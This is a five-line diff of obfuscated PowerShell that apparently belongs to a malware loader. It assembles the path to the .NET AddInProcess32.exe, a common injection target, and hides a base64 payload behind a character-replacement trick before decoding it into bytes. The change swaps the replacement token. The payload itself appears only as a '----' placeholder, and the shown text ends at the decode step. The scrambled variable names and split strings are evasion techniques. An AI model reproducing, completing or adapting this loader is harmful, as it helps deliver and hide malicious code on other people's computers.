@@ -1,5 +1,5 @@
 $dadqdqwdwqdfqfqpoiu = 'C:\Windows\Microsoft.NET\' + 'Framework\v4.0.30319\' + 'AddInProcess32.exe';
-$dadadqwdq = '↓:↓';
+$dadadqwdq = '.';
 $dasdafqqeq = 'A';
 $ummtu = '----'.replace( $dadadqwdq, $dasdafqqeq );
 [Byte[]] $laWwJ = [System.Convert]::FromBase64String( $ummtu );
